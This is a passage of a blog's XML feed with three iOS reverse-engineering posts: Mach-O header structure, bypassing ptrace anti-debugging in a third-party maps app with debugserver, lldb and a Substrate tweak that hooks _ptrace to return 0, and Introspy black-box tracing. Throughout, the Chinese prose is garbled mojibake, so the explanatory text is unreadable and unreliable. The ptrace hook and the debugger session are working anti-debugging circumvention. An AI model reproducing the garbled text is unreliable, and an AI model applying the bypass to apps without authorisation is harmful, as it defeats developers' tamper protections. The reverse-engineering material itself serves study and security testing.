<span class="comment">/* cpu specifier */</span></div><div class="line"><span class="keyword">cpu_subtype_t</span> cpusubtype; <span class="comment">/* machine specifier */</span></div><div class="line"><span class="keyword">uint32_t</span> filetype; <span class="comment">/* type of file */</span></div><div class="line"><span class="keyword">uint32_t</span> ncmds; <span class="comment">/* number of load commands */</span></div><div class="line"><span class="keyword">uint32_t</span> sizeofcmds; <span class="comment">/* the size of all the load commands */</span></div><div class="line"><span class="keyword">uint32_t</span> flags; <span class="comment">/* flags */</span></div><div class="line"><span class="keyword">uint32_t</span> reserved; <span class="comment">/* reserved */</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">/* Constant for the magic field of the mach_header_64 (64-bit architectures) */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_MAGIC_64 0xfeedfacf <span class="comment">/* the 64-bit mach magic number */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_CIGAM_64 0xcffaedfe <span class="comment">/* NXSwapInt(MH_MAGIC_64) */</span></span></div><div class="line"></div><div class="line"><span class="comment">/*</span></div></pre></td></tr></table></figure>
<p>æ ¹æ®mach_headerå’Œmach_header_64çš„å®šä¹‰ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºHeadersçš„ä¸»è¦ä½œç”¨å°±æ˜¯è¿…é€Ÿç¡®è®¤å½“å‰æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹è¿è¡Œç¯å¢ƒç­‰ã€‚</p>
<p>è¿™é‡Œæ‰¾ä¸ªä¾‹å­ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªhelloworld.cæ–‡ä»¶ï¼Œ</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ä¿å­˜ååœ¨ç»ˆç«¯åå†å½“å‰ç›®å½•ä¸‹è¾“å…¥ä»£ç <br>clang helloworld.c<br>å¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šåå­—çš„è¯ï¼Œç¼–è¯‘å™¨ä¼šé»˜è®¤æŠŠhelloworld.cæ–‡ä»¶ç¼–è¯‘æˆåä¸ºa.outçš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p>æˆ‘ä»¬ç”¨MachOViewæ‰“å¼€è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¥çœ‹çœ‹headersä¸­çš„è¯¦ç»†ä¿¡æ¯(è¿™é‡Œå¯ä»¥é€šè¿‡<code>otool -l a.out</code>æ¥æŸ¥çœ‹ï¼Œä½†çœ‹èµ·æ¥æ¯”è¾ƒåƒåŠ›)</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/4C4E0C28-68AB-4D4E-9B38-8A520350E25F.png" alt="4C4E0C28-68AB-4D4E-9B38-8A520350E25F"></p>
<ul>
<li>Magicï¼šé­”æ•°ï¼Œç”¨äºå¿«é€Ÿç¡®è®¤è¯¥æ–‡ä»¶ç”¨äº64ä½è¿˜æ˜¯32ä½ï¼Œ32ä½æ˜¯0xfeedface,64ä½æ˜¯0xfeedfacf</li>
<li>Cpu Typeï¼šCPUç±»å‹ï¼Œ</li>
<li>Cpusub Typeï¼šå¯¹åº”çš„å…·ä½“ç±»å‹ï¼Œæ¯”å¦‚arm64ã€armv7</li>
<li>File Typeï¼šæ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚å¯æ‰§è¡Œæ–‡ä»¶ã€åº“æ–‡ä»¶ã€Dsymæ–‡ä»¶ï¼Œå›¾ä¸­ä»£è¡¨å¯æ‰§è¡Œæ–‡ä»¶,å¦‚ä¾‹å­ä¸­çš„MH_EXECUTEä¸ºå¯æ‰§è¡Œæ–‡ä»¶</li>
<li>MH_PIE:åŠ è½½ç¨‹åºåœ¨éšæœºçš„åœ°å€ç©ºé—´ï¼Œåªåœ¨MH_EXECUTEä¸­ä½¿ç”¨</li>
<li>MH_TWOLEVEL:ä¸¤çº§ç©ºé—´åç§°</li>
<li>MH_DYLDLINK:è¿æ¥å™¨linker</li>
<li>dyldï¼šåŠ¨æ€é“¾æ¥å™¨ï¼Œä»–æ˜¯è‹¹æœå¼€æºçš„ä¸€ä¸ªé¡¹ç›®ï¼Œå¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ï¼Œå½“å†…æ ¸æ‰§è¡ŒLC_DYLINKæ—¶ï¼Œè¿æ¥å™¨ä¼šå¯åŠ¨ï¼ŒæŸ¥æ‰¾è¿›ç¨‹æ‰€ä¾èµ–çš„åŠ¨æ€åº“ï¼Œå¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚dyldæ˜¯ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹ï¼Œä»–ä¸å±äºå†…æ ¸éƒ¨åˆ†ï¼Œè€Œæ˜¯ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å¼€æºé¡¹ç›®è¢«è‹¹æœç»´æŠ¤ï¼ˆä½†æ˜¯å±äºDarwinéƒ¨åˆ†ï¼‰</li>
<li>éšæœºåœ°å€ç©ºé—´ASLRï¼šè¿›ç¨‹æ¯ä¸€æ¬¡å¯åŠ¨ï¼Œåœ°å€ç©ºé—´éƒ½ä¼šç®€å•çš„éšæœºåŒ–ï¼Œå¦åˆ™ï¼Œå¦‚æœç¨‹åºæ¯ä¸€æ¬¡å¯åŠ¨çš„è™šæ‹Ÿå†…å­˜é•œåƒéƒ½æ˜¯ä¸€è‡´çš„ï¼Œå®¹æ˜“è¢«é»‘å®¢é‡‡å–é‡å†™å†…å­˜çš„æ–¹å¼æ¥ç ´è§£ã€‚</li>
</ul>
<h3 id="Load-Commands"><a href="#Load-Commands" class="headerlink" title="Load Commands"></a>Load Commands</h3><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">load_command</span> </span>&#123;</div><div class="line">uint32_t cmd; /* type <span class="keyword">of</span> load command */</div><div class="line">uint32_t cmdsize; /* total size <span class="keyword">of</span> command <span class="keyword">in</span> bytes */</div></pre></td></tr></table></figure>
<p>Load Commandsç›´æ¥è·Ÿåœ¨headersåé¢ï¼ŒåŠ è½½headersä¹‹åé€šè¿‡è§£æLoadCommandsæ¥åŠ è½½æ¥ä¸‹æ¥çš„æ•°æ®ï¼ŒLC_SEGMENT_64å’ŒLC_SEGMENTæ˜¯åŠ è½½çš„ä¸»è¦å‘½ä»¤ï¼Œä»–ä»¬è´Ÿè´£æŒ‡å¯¼å†…æ ¸è®¾ç½®è¿›ç¨‹çš„å†…å­˜ç©ºé—´</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/F784BC98-6C5A-4723-8CE9-77A3042481E7.png" alt="F784BC98-6C5A-4723-8CE9-77A3042481E7"></p>
<p>å…³äºå…·ä½“å¦‚ä½•é€šè¿‡load_commandsçš„cmdå­—æ®µæ¥åŠ è½½mach-o æ–‡ä»¶ï¼Œæœ‰å…´è¶£å¯ä»¥å»/usr/include/mach-o ä¸‹é¢çœ‹çœ‹æºç ï¼Œè¿™é‡Œåªè¦çŸ¥é“æ ¹æ®cmdå­—æ®µçš„ç±»å‹ä¸åŒï¼Œä½¿ç”¨äº†ä¸åŒçš„å‡½æ•°æ¥åŠ è½½ï¼ŒåŸºæœ¬çœ‹è¯­ä¹‰éƒ½å¯ä»¥è§£å†³ã€‚</p>
<p>è¿™é‡Œå¤§æ¦‚è®²ä¸€ä¸‹å‰é¢è¿™äº›æ®µåˆ†åˆ«ä»£è¡¨çš„å«ä¹‰ï¼Œ_TEXTå¯¹åº”çš„å°±æ˜¯ä»£ç æ®µï¼Œ_DATAå¯¹åº”çš„æ˜¯å¯è¯»æˆ–å¯å†™çš„æ•°æ®ï¼Œ_LINKEDITæ˜¯æ”¯æŒdyldçš„ï¼Œé‡Œé¢åŒ…å«ç¬¦å·è¡¨ç­‰æ•°æ®ã€‚</p>
<h3 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h3><p>ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åŒ…å«å¤šä¸ªæ®µï¼Œä¹Ÿå°±æ˜¯å¤šä¸ª sectionã€‚å¯æ‰§è¡Œæ–‡ä»¶ä¸åŒçš„éƒ¨åˆ†å°†åŠ è½½è¿›ä¸åŒçš„sectionï¼Œå¹¶ä¸”ä¸åŒçš„sectionä¼šè½¬æ¢è¿›ä¸åŒçš„segmentä¸­ã€‚è¿™ä¸ªæ¦‚å¿µå¯¹äºæ‰€æœ‰çš„å¯æ‰§è¡Œæ–‡ä»¶éƒ½æ˜¯æˆç«‹çš„ã€‚</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://objccn.io/issue-6-3/" target="_blank" rel="external">https://objccn.io/issue-6-3/</a> </p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> OSX </tag>
            
            <tag> Mach-O </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[é€šè¿‡Debugserver&lldbæ¥è°ƒè¯•ä¸€ä¸ªè¢«åŠ äº†ptraceåè°ƒè¯•çš„app]]></title>
      <url>http://Hello-Sherlock.github.io/2016/12/01/two-Blog/</url>
      <content type="html"><![CDATA[<blockquote>
<p>å…³äºptrace,ptraceæ˜¯ä¸€ä¸ªç³»ç»Ÿå‡½æ•°ï¼Œå®ƒæä¾›äº†ä¸€ç§å¯ä»¥ä½¿çˆ¶è¿›ç¨‹ç›‘æ§å…¶ä»–è¿›ç¨‹çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥æ”¹å˜<br>å­è¿›ç¨‹ä¸­çš„å¯„å­˜å™¨å’Œå†…æ ¸å°è±¡ï¼Œå› è€Œå¯ä»¥å®ç°æ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨çš„è·Ÿè¸ªã€‚<br>ä½¿ç”¨ptraceï¼Œå¯ä»¥åœ¨ç”¨æˆ·å±‚æ‹¦æˆªå’Œä¿®æ”¹ç³»ç»Ÿè°ƒç”¨ã€‚</p>
</blockquote>
<a id="more"></a>
<p>é‚£ä¹ˆæˆ‘ä»¬æ¥åˆ°å®˜ç½‘çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆè®²çš„<a href="http://iphonedevwiki.net/index.php/Debugserver" target="_blank" rel="external">http://iphonedevwiki.net/index.php/Debugserver</a><br>å®˜ç½‘ä¸€å¼ å›¾è¡¨è¾¾å¾—å¾ˆæ¸…æ¥š<br><img src="http://oh5mz2415.bkt.clouddn.com/one" alt="one"></p>
<p>æˆ‘ä»¬è¿™é‡Œé¦–å…ˆä½¿ç”¨debugserveræ­£å¸¸é™„åŠ ï¼Œæ¥åˆ¤æ–­ç›®æ ‡appç©¶ç«Ÿæœ‰æ²¡æœ‰ä½¿ç”¨ptraceæ¥åè°ƒè¯•<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">linguochengde-iPhone:~ root# debugserver *:1234 -a AMapiPhone</div><div class="line">debugserver-@(#)PROGRAM:debugserver  PROJECT:debugserver<span class="string">-320</span>.2.89</div><div class="line"> for armv7.</div><div class="line">Attaching to process AMapiPhone...</div><div class="line"><span class="keyword">error: </span>failed to attach to process named: ""</div><div class="line">Exiting.</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œdebugserveré™„åŠ å¤±è´¥ï¼Œå†æ ¹æ®ç›®å‰å…¬å¼€çš„åè°ƒè¯•çš„æ–¹æ³•åªæœ‰é€šè¿‡ptraceç³»ç»Ÿå‡½æ•°æ¥åè°ƒè¯•ï¼Œäºæ˜¯äº†è§£äº†ptraceååŸºæœ¬ä¸Šä¹Ÿå°±å¾ˆå¥½ç»•è¿‡äº†</p>
<p>é¦–å…ˆé€šè¿‡lldbæ¥å¯åŠ¨app<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">linguochengde-iPhone:~ root# debugserver -x posix *:<span class="number">1234</span> <span class="regexp">/var/m</span>obile<span class="regexp">/Containers/</span>Bundle<span class="regexp">/Application/</span><span class="number">9</span>F0A5D73-<span class="number">7589</span>-<span class="number">4</span>BE5-A209-A96002B6D641<span class="regexp">/AMapiPhone.app/</span>AMapiPhone</div><div class="line">debugserver-@(#)PROGRAM:debugserver  <span class="keyword">PROJECT</span>:debugserver-<span class="number">320.2</span>.<span class="number">89</span></div><div class="line"> <span class="keyword">for</span> armv7.</div><div class="line">Listening to port <span class="number">1234</span> <span class="keyword">for</span> a connection <span class="keyword">from</span> *...</div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œä¹‹å‰å‚è€ƒ<a href="http://bbs.iosre.com/t/7-2-0-ios/770ä¸­çš„backboardå‚æ•°ï¼Œå‘ç°å¤±è´¥ï¼Œäºæ˜¯æŠŠå‚æ•°æ¢æˆposixådebugserverå¯ä»¥æ­£å¸¸é™„åŠ " target="_blank" rel="external">http://bbs.iosre.com/t/7-2-0-ios/770ä¸­çš„backboardå‚æ•°ï¼Œå‘ç°å¤±è´¥ï¼Œäºæ˜¯æŠŠå‚æ•°æ¢æˆposixådebugserverå¯ä»¥æ­£å¸¸é™„åŠ </a></p>
<p>ç„¶åå°±æŒ‰ç…§ç½‘ä¸Šå¾ˆå¤šæ–¹æ³•ï¼Œå¯åŠ¨lldbåï¼Œå…ˆé€šè¿‡åœ¨ptraceä¸Šä¸‹æ–­ç‚¹ï¼Œæ‰¾åˆ°ptraceåç§»åçš„åœ°å€ï¼Œå†é€šè¿‡image list -o -fæ‰¾åˆ°ASLRåç§»ï¼Œç›¸å‡ç®—å‡ºptraceçš„æ­£ç¡®ä½ç½®ååœ¨idaæˆ–è€…hopperä¸­æ‰“å¼€ï¼Œè¿›ä¸€æ­¥åˆ†æ</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">â”Œâ”€(~)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€(linguocheng<span class="comment">@Sherlock-HolmesdeMacBook-Pro:s002)â”€â”</span></div><div class="line">â””â”€(<span class="number">09</span>:<span class="number">27</span>:<span class="number">13</span>)â”€â”€&gt; lldb                                              â”€â”€(ä¸‰,<span class="number">1130</span>)â”€â”˜</div><div class="line">(lldb)  process connect connect://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">102</span>:<span class="number">1234</span></div><div class="line"><span class="symbol">Process</span> <span class="number">59223</span> stopped</div><div class="line">* thread <span class="number">#1</span>: tid = <span class="number">0x3240a</span>, <span class="number">0x1fe4d000</span> dyld`_dyld_start, stop reason = signal SIGSTOP</div><div class="line">    frame <span class="number">#0</span>: <span class="number">0x1fe4d000</span> dyld`_dyld_start</div><div class="line"><span class="symbol">dyld</span>`_dyld_start:</div><div class="line">-&gt;  <span class="number">0x1fe4d000</span> &lt;+<span class="number">0</span>&gt;:  <span class="keyword">mov </span>   <span class="built_in">r8</span>, <span class="built_in">sp</span></div><div class="line">    <span class="number">0x1fe4d004</span> &lt;+<span class="number">4</span>&gt;:  <span class="keyword">sub </span>   <span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#16</span></div><div class="line">    <span class="number">0x1fe4d008</span> &lt;+<span class="number">8</span>&gt;:  <span class="keyword">bic </span>   <span class="built_in">sp</span>, <span class="built_in">sp</span>, <span class="number">#7</span></div><div class="line">    <span class="number">0x1fe4d00c</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">ldr </span>   <span class="built_in">r3</span>, [<span class="built_in">pc</span>, <span class="number">#0x70</span>]           <span class="comment">; &lt;+132&gt;</span></div><div class="line">(lldb) <span class="keyword">b </span>ptrace</div><div class="line"><span class="keyword">Breakpoint </span><span class="number">1</span>: no locations (pending).</div><div class="line"><span class="symbol">WARNING</span>:  Unable to resolve <span class="keyword">breakpoint </span>to any actual locations.</div><div class="line">(lldb) c</div><div class="line"><span class="symbol">Process</span> <span class="number">59223</span> resuming</div><div class="line"><span class="number">1</span> location <span class="keyword">added </span>to <span class="keyword">breakpoint </span><span class="number">1</span></div><div class="line"><span class="number">2016</span>-<span class="number">11</span>-<span class="number">30</span> <span class="number">09</span>:<span class="number">27</span>:<span class="number">57</span>.<span class="number">361</span> AMapiPhone[<span class="number">59223</span>:<span class="number">205834</span>] Foundation called mkdir(<span class="string">"/tmp/(A Document Being Saved By é«˜å¾·åœ°å›¾)"</span>), <span class="keyword">it </span>didn<span class="string">'t return 0, and errno was set to 1.</span></div><div class="line">2016-11-30 09:27:57.378 AMapiPhone[59223:205834] Foundation called mkdir("/tmp/(A Document Being Saved By é«˜å¾·åœ°å›¾)"), it didn't return <span class="number">0</span>, <span class="keyword">and </span>errno was set to <span class="number">1</span>.</div><div class="line"><span class="symbol">Process</span> <span class="number">59223</span> stopped</div><div class="line">* thread <span class="number">#1</span>: tid = <span class="number">0x3240a</span>, <span class="number">0x364b0e58</span> libsystem_kernel.dylib`__ptrace, queue = <span class="string">'com.apple.main-thread'</span>, stop reason = <span class="keyword">breakpoint </span><span class="number">1</span>.<span class="number">1</span></div><div class="line">    frame <span class="number">#0</span>: <span class="number">0x364b0e58</span> libsystem_kernel.dylib`__ptrace</div><div class="line"><span class="symbol">libsystem_kernel.dylib</span>`__ptrace:</div><div class="line">-&gt;  <span class="number">0x364b0e58</span> &lt;+<span class="number">0</span>&gt;:  <span class="keyword">ldr </span>   <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="number">#0x4</span>]           <span class="comment">; &lt;+12&gt;</span></div><div class="line">    <span class="number">0x364b0e5c</span> &lt;+<span class="number">4</span>&gt;:  <span class="keyword">ldr </span>   <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="built_in">r12</span>]</div><div class="line">    <span class="number">0x364b0e60</span> &lt;+<span class="number">8</span>&gt;:  <span class="keyword">b </span>     <span class="number">0x364b0e68</span>                <span class="comment">; &lt;+16&gt;</span></div><div class="line">    <span class="number">0x364b0e64</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">addeq </span> <span class="built_in">r9</span>, <span class="built_in">r6</span>, <span class="number">#204</span>, <span class="number">#2</span></div><div class="line">(lldb) p/x $<span class="built_in">lr</span></div><div class="line">(unsigned int) <span class="number">$0</span> = <span class="number">0x0004515d</span></div><div class="line">(lldb) image list -o -f</div><div class="line">[  <span class="number">0</span>] <span class="number">0x0002f000</span> /private/var/mobile/Containers/<span class="keyword">Bundle/Application/9F0A5D73-7589-4BE5-A209-A96002B6D641/AMapiPhone.app/AMapiPhone(0x0000000000033000)</span></div></pre></td></tr></table></figure>
<p><img src="http://oh5mz2415.bkt.clouddn.com/two" alt="two"></p>
<p>å¯ä»¥çœ‹åˆ°å’Œä¹‹å‰æ–‡ç« ä¸­ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ˜¯åœ¨startä¸­åŠ å…¥äº†ptraceç³»ç»Ÿå‡½æ•°ï¼Œæˆ‘ä»¬åˆ†æå½“ptraceç¬¬ä¸€ä¸ªå‚ä¸º31æ—¶ï¼Œä¼šdetachè°ƒè¯•å™¨ã€‚æ‰€ä»¥ï¼Œnewptraceä¸­å¯ä»¥ç›´æ¥è¿”å›0ï¼Œä¹Ÿå¯ä»¥åˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°ç­‰äº31æ—¶ï¼Œæ›´æ”¹å‚æ•°çš„è¿”å›å€¼</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*oldptrace)</span><span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newptrace</span><span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line">%ctor &#123;</div><div class="line"></div><div class="line">        MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>), (<span class="keyword">void</span> *)newptrace, (<span class="keyword">void</span> **)&amp;oldptrace);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>OKï¼Œæœ‰äº†tweakåŠ æŒå°±å¯ä»¥åŠ¨æ€è°ƒè¯•äº†</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">linguocheng <span class="keyword">in</span> ~ Î» ssh root@<span class="number">192.168</span>.<span class="number">1.102</span></div><div class="line">root@<span class="number">192.168</span>.<span class="number">1.102</span>'s password:</div><div class="line">linguochengde-iPhone:~ root<span class="comment"># debugserver *:1234 -a AMapiPhone</span></div><div class="line">debugserver-@(<span class="comment">#)PROGRAM:debugserver  PROJECT:debugserver-320.2.89</span></div><div class="line"> <span class="keyword">for</span> armv7.</div><div class="line">Attaching <span class="keyword">to</span> process AMapiPhone...</div><div class="line">Listening <span class="keyword">to</span> <span class="keyword">port</span> <span class="number">1234</span> <span class="keyword">for</span> a connection <span class="keyword">from</span> *...</div></pre></td></tr></table></figure>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">â”Œâ”€(~)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€(linguocheng<span class="comment">@Sherlock-HolmesdeMacBook-Pro:s002)â”€â”</span></div><div class="line">â””â”€(<span class="number">11</span>:<span class="number">27</span>:<span class="number">21</span>)â”€â”€&gt; lldb                                        <span class="number">146</span> â†µ â”€â”€(å››,<span class="number">120</span></div><div class="line">(lldb) process connect connect://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">102</span>:<span class="number">1234</span></div><div class="line"><span class="symbol">Process</span> <span class="number">1996</span> stopped</div><div class="line">* thread <span class="number">#1</span>: tid = <span class="number">0x21a2</span>, <span class="number">0x322a549c</span> libsystem_kernel.dylib`mach_msg_trap + <span class="number">20</span>, name = <span class="string">'RouMainThread'</span>, queue = <span class="string">'com.apple.main-thread'</span>, stop reason = signal SIGSTOP</div><div class="line">    frame <span class="number">#0</span>: <span class="number">0x322a549c</span> libsystem_kernel.dylib`mach_msg_trap + <span class="number">20</span></div><div class="line"><span class="symbol">libsystem_kernel.dylib</span>`mach_msg_trap:</div><div class="line">-&gt;  <span class="number">0x322a549c</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">pop </span>   &#123;<span class="built_in">r4</span>, <span class="built_in">r5</span>, <span class="built_in">r6</span>, <span class="built_in">r8</span>&#125;</div><div class="line">    <span class="number">0x322a54a0</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">bx </span>    <span class="built_in">lr</span></div><div class="line"></div><div class="line"><span class="symbol">libsystem_kernel.dylib</span>`mach_msg_overwrite_trap:</div><div class="line">    <span class="number">0x322a54a4</span> &lt;+<span class="number">0</span>&gt;:  <span class="keyword">mov </span>   <span class="built_in">r12</span>, <span class="built_in">sp</span></div><div class="line">    <span class="number">0x322a54a8</span> &lt;+<span class="number">4</span>&gt;:  <span class="keyword">push </span>  &#123;<span class="built_in">r4</span>, <span class="built_in">r5</span>, <span class="built_in">r6</span>, <span class="built_in">r8</span>&#125;</div><div class="line">(lldb)</div></pre></td></tr></table></figure>
<p>å‚è€ƒ:<a href="http://bbs.iosre.com/t/7-2-0-ios/770" target="_blank" rel="external">http://bbs.iosre.com/t/7-2-0-ios/770</a><br>    <a href="http://www.linuxjournal.com/article/6100?page=0,1" target="_blank" rel="external">http://www.linuxjournal.com/article/6100?page=0,1</a></p>
]]></content>
      
        
        <tags>
            
            <tag> ptrace </tag>
            
            <tag> tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Introspyå¯¹iOSåº”ç”¨é»‘ç›’æµ‹è¯•]]></title>
      <url>http://Hello-Sherlock.github.io/2016/11/24/one-Blog/</url>
      <content type="html"><![CDATA[<a id="more"></a>
<ul>
<li><p>é¦–å…ˆè¦åœ¨è¶Šç‹±æ‰‹æœºä¸Šå®‰è£…Introspyè¿™ä¸ªå·¥å…·ï¼ˆè¿™é‡Œçš„ç¯å¢ƒæ˜¯ iPhone<br>4sï¼Œ8.3ï¼‰ï¼Œç”±äºç¬”è€…ç”µè„‘å®‰è£…äº† oh-my-zshï¼Œå¯¼è‡´wgetå‡ºé”™ï¼Œè€Œæš‚æ—¶æ²¡æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œäºæ˜¯ç½‘ä¸Šçš„é‚£äº›æ–¹æ³•å¯¹ç¬”è€…æ¥è¯´éƒ½ä¸é€‚ç”¨ï¼Œç›¸ä¿¡å¾ˆå¤šå®‰è£…äº†oh-my-zshçš„æœ‹å‹ä¹Ÿæœ‰è¿™ä¸ªå›°æƒ‘ï¼Œæƒ³è¦zshçš„ç‚«é…·ä½†ç”±<br>äºé…ç½®æ–‡ä»¶è·¯å¾„ç­‰é—®é¢˜é€ æˆå¾ˆå¤šå›°æƒ‘ï¼Œç¬”è€…Googleäº†å¥½å¤šæ–¹æ³•æŠ˜è…¾äº†æŒºä¹…ä¹Ÿæ²¡æ‰¾åˆ°å°½äººæ„çš„æ–¹æ³•ï¼Œæœºç¼˜å·§åˆåœ¨å¨é”‹ä¸Šæ‰¾åˆ° <a href="http://apt.so/5877507ï¼Œ" target="_blank" rel="external">http://apt.so/5877507ï¼Œ</a> æ·»åŠ ç„¶åæ‰¾åˆ°Introspyï¼Œå®‰è£…ã€‚</p>
</li>
<li><p>é‡å¯åæ‰“å¼€ï¼Œè¿›å…¥è®¾ç½®ï¼Œå°±å¯ä»¥çœ‹åˆ°äº†ã€‚</p>
</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/B9057178-D1F7-4E24-A29E-1B81452D9140.png" alt="B9057178-D1F7-4E24-A29E-1B81452D9140"></p>
<ul>
<li>æ‰“å¼€è®¾ç½®åŠŸèƒ½<br>Introspy-app ç”¨æ¥é€‰æ‹©ä½ è¦è·Ÿè¸ªçš„app<br>Introspy-setting å¸¸è§„è·Ÿè¸ªè®¾ç½®é€‰é¡¹ï¼Œé»˜è®¤å…¨éƒ¨å¼€å¯</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-2@2x.png" alt="QQ20161031-2@2x"></p>
<ul>
<li>å¦‚æœè¿™æ˜¯ä½ çš„appåœ¨åå°è¿è¡Œï¼Œä½ è¦å…ˆkillè¿›ç¨‹ï¼Œç„¶åé‡æ–°æ‰“å¼€ï¼Œä½ çš„appï¼Œè¿æ¥Xcodeï¼Œ<br>åœ¨window-deviceä¸­å°±å¯ä»¥æŸ¥çœ‹è¾“å‡ºæ—¥å¿—äº†</li>
</ul>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161031-10@2x.png" alt="QQ20161031-10@2x"></p>
<ul>
